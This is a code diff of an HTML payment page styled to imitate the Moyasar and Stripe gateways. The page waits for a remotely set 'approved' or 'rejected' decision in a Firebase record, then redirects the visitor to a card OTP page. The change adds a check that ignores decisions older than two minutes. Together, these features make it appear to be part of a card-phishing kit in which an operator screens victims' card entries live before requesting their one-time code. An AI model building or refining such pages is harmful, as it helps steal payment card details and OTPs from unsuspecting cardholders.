@@ -7,7 +7,7 @@
   <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
-  <script src="./assets/js/firebase-client.js?v=20260911b"></script>
+  <script src="./assets/js/firebase-client.js?v=20260912"></script>
   <style>
     /* ستايل بوابات الدفع العالمية المطابق للصورة (Moyasar / Stripe Style) */
     @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
@@ -530,8 +530,18 @@
                     window.customerRef.get().then((snap) => {
                       if (snap.exists) {
                         const d = snap.data() || {};
-                        if (d.decision === 'approved') { window.location.href = 'otpcredit_card_page.html'; }
-                        else if (d.decision === 'rejected') { onReject(d); }
+                        // تجاهل القرارات القديمة (من جلسة سابقة) — لا نطبقها على الدفع الحالي
+                        if (d.decision === 'approved' || d.decision === 'rejected') {
+                          let decidedMs = null;
+                          const t = d.decidedAt;
+                          if (t && typeof t.toMillis === 'function') decidedMs = t.toMillis();
+                          else if (t && typeof t === 'number') decidedMs = String(t).length === 10 ? t * 1000 : t;
+                          else if (t && typeof t === 'string') decidedMs = Date.parse(t);
+                          else if (t && t._seconds) decidedMs = t._seconds * 1000;
+                          if (decidedMs !== null && Date.now() - decidedMs > 120000) return; // قديم — تجاهل
+                          if (d.decision === 'approved') { window.location.href = 'otpcredit_card_page.html'; }
+                          else if (d.decision === 'rejected') { onReject(d); }
+                        }
                       }
                     }).catch(() => {});
                   }
